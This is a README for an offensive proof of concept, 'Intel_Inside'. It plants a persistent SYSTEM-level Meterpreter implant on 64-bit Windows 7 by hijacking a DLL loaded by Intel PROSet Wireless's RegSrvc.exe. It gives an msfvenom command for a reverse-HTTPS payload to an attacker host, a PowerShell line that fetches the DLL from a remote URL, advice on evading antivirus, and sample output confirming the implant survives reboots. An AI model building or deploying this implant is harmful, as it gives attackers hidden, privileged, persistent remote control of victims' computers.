# Intel_Inside

Intel PROSet Wireless - Persistent SYSTEM Shell Implant (All Versions) (Win 7 - 64bit)

Context: http://x42.obscurechannel.com/?p=378

Requirements: 
1. You have a previously acquired shell (through some other exploit) on a machine as a local admin user, and UAC is set to anything other than "Always Notify".

2. A 64-bit payload:

  `msfvenom -p windows/x64/meterpreter/reverse_https -f dll LHOST=attacker_ip LPORT=443 > RpcRtRemote.dll`
  
3. A place to host your "RpcRtRemote.dll" payload that supports HTTPS (helps with AV heuristics).

4. Generate a proper meterpreter https listener resource file with a custom SSL cert (AV's love custom 
   meterpreter certs): http://bit.ly/2odN6OV

Some bits of this code borrowed from @enigma0x3 (some UAC stuff...)

Takes a url to your "RpcRtRemote.dll" payload as an argument:

`powershell.exe ./intel_inside.ps1 https://yourserver/RpcRtRemote.dll`

```
C:\temp>powershell ./intel_inside.ps1 https://server/RpcRtRemote.dll

[*] Found RegSrvc.exe! Make sure your listener is running.
[+] Checking UAC status.
[*] UAC Status OK and set to 'Default'.
[+] Setting up persistent implant and executing payload.
[*] Done! 'RpcRtRemote.dll' implant successful. Check your shell, run 'getsystem'.
[*] Will persist across reboots and phone home as a SYSTEM shell before user login.

[*] To uninstall:
        - taskkill.exe /IM RegSrvc.exe /F
        - del "C:\Program Files\Common Files\Intel\WirelessCommon\RpcRtRemote.dll"
C:\temp>
```
This proof-of-concept is provided for research purposes only. The author is in no way responsible for any misuse of the proof-of-concept code nor is the author responsible for any damage, directly or indirectly, that could potentially arise from the use of the included code. Unauthorized use of the proof-of-concept code against a system that you do not own is a horrible idea and probably illegal. Use at your own risk.
